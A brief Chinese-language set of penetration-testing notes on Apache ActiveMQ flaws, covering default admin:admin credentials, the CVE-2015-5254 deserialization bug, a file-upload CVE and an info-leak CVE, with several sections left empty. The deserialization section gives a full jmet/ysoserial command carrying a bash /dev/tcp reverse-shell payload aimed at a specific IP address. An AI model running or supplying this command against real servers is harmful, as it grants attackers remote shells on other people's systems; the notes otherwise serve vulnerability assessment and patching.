# ActiveMQ
Apache ActiveMQ是Apache软件基金会所研发的开放源代码消息中间件；由于ActiveMQ是一个纯Java程序，因此只需要操作系统支持Java虚拟机，ActiveMQ便可执行。
默认开放端口为:8161,61616   
## 弱口令漏洞

### 漏洞说明
存在默认端口和默认密码 / 未授权访问 (默认密码为 admin:admin)，部分存在guest:guest
### 涉及范围
全版本
### 验证方法
poc_ssh_weakpass.py

### 利用方法
无

### 修复方式

1. 修改登录密码。密码配置文件：`conf/jetty-realm.properties`修改口令
2. 修改61616端口访问密码，端口号。  

## 反序列化漏洞 CVE-2015-5254
### 漏洞说明
Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。
该漏洞利用需要获得后台管理员权限后触发恶意任务

### 涉及范围
5.1-5.13
### 验证方法


### 利用方法
**利用过程：**
1. 构造（可以使用ysoserial）可执行命令的序列化对象
`java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "bash -i >& /dev/tcp/{you_ip}/{your_port}>&1" -Yp ROME 45.32.101.90   61616`
2. 作为一个消息，发送给目标61616端口
3. 访问的Web管理页面，读取消息，触发漏洞
### 修复方式


## 文件上传漏洞 CVE-2016-3088
### 漏洞说明
ActiveMQ 中的 FileServer 服务允许用户通过 HTTP PUT 方法上传文件到指定目录

### 影响范围

### 验证方法

### 利用方法


## 信息泄露漏洞 CVE-2017-15709
### 漏洞说明
Apache ActiveMQ默认消息队列61616端口对外，61616端口使用了OpenWire协议，这个端口会暴露服务器相关信息，这些相关信息实际上是debug信息。
### 影响范围
apache-activemq: 5.15.0~5.15.2
apache-activemq: 5.14.0~5.14.5

### 验证方法
**手工验证**
`nc host 61616` 查看返回信息是否存在操作系统等信息。
**pocsuite**
poc_active_infoleak.py

### 修复方式